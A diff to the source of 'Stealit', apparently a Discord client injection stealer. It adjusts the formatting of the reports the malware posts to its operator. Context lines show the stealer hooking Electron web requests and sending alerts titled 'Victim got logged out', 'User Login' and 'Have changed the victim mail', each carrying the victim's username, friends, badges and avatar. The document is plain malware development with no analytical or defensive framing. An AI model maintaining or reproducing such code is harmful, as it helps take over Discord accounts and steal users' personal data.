@@ -601,7 +601,7 @@ const FirstTime = async () => {
         ));
       var params = await makeEmbed({
         title: "Stealit Initialized",
-        description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
+        description: `- Injection Path: ${client_discord}`,
         fields: [
           {
             name: "Username <:mention:1206228892629864488>",
@@ -651,8 +651,7 @@ const FirstTime = async () => {
         title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
         color: config["embed-color"],
         description: Friends.badges,
-        image: userBanner,
-        thumbnail: userAvatar,
+
       });
 
       params.embeds.push(params2.embeds[0]);
@@ -711,7 +710,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
           title:
             "<:stealit:1206869154691416084> Victim got logged out",
-          description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
+          description: `- Injection Path: ${client_discord}`,
           fields: [
             {
               name: "Username <:mention:1206228892629864488>",
@@ -759,13 +758,14 @@ const FirstTime = async () => {
               inline: false,
             },
           ],
+          thumbnail: userAvatar,
 
         });
         var params2 = await makeEmbed({
           title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
           color: config["embed-color"],
           description: Friends.badges,
-          image: userBanner,
+  
         });
 
         params.embeds.push(params2.embeds[0]);
@@ -1765,7 +1765,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               var params = await makeEmbed({
                 title: "<:stealit:1206869154691416084> User Login",
                 color: config["embed-color"],
-                description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
+                description: `- Injection Path: ${client_discord}`,
                 fields: [
                   {
                     name: "Username <:mention:1206228892629864488>",
@@ -1829,6 +1829,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     inline: false,
                   },
                 ],
+                thumbnail: userAvatar,
 
                     });
 
@@ -1836,7 +1837,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
                 color: config["embed-color"],
                 description: Friends.badges,
-                image: userBanner,
+        
                     });
 
               params.embeds.push(params2.embeds[0]);
@@ -1864,7 +1865,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             var params = await makeEmbed({
               title: "<:stealit:1206869154691416084> User Login",
               color: config["embed-color"],
-              description: `\`\`\`- Injection Path: ${client_discord}\`\`\``,
+              description: `- Injection Path: ${client_discord}`,
               fields: [
                 {
                   name: "User <:mention:1206228892629864488>",
@@ -1912,6 +1913,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                   inline: false,
                 },
               ],
+              thumbnail: userAvatar,
 
                 });
 
@@ -1919,7 +1921,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
               color: config["embed-color"],
               description: Friends.badges,
-              image: userBanner,
+      
                 });
 
             params.embeds.push(params2.embeds[0]);
@@ -1993,6 +1995,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: false,
               },
             ],
+            thumbnail: userAvatar,
 
             });
 
@@ -2000,7 +2003,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
             color: config["embed-color"],
             description: Friends.badges,
-            image: userBanner,
+    
             });
 
           params.embeds.push(params2.embeds[0]);
@@ -2029,7 +2032,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                   title:
                     "<:stealit:1206869154691416084> Have changed the victim mail",
                   color: config["embed-color"],
-                  description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
+                  description: `- Injection Path: ${client_discord}`,
                   fields: [
                     {
                       name: "Username <:mention:1206228892629864488>",
@@ -2072,6 +2075,8 @@ electron.session.defaultSession.webRequest.onCompleted(
                       inline: false,
                     },
                   ],
+                  thumbnail: userAvatar,
+
                         });
 
                 await post(params);
@@ -2083,7 +2088,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             title:
               "<:stealit:1206869154691416084> Detect Email Changed",
             color: config["embed-color"],
-            description: `\`\`\`- Injection Path: ${client_discord}\n\`\`\``,
+            description: `- Injection Path: ${client_discord}`,
             fields: [
               {
                 name: "Username <:mention:1206228892629864488>",
@@ -2137,6 +2142,7 @@ electron.session.defaultSession.webRequest.onCompleted(
 
               },
             ],
+            thumbnail: userAvatar,
 
             });
 
@@ -2144,7 +2150,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
             color: config["embed-color"],
             description: Friends.badges,
-            image: userBanner,
+    
             });
 
           params.embeds.push(params2.embeds[0]);
@@ -2216,6 +2222,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     inline: false,
                   },
                 ],
+                thumbnail: userAvatar,
 
                     });
               await post(params);
@@ -2298,6 +2305,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               inline: false,
             },
           ],
+          thumbnail: userAvatar,
 
         });
         await post(params);
@@ -2400,6 +2408,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               inline: false,
             }, 
           ],
+          thumbnail: userAvatar,
 
         });
         await post(params);
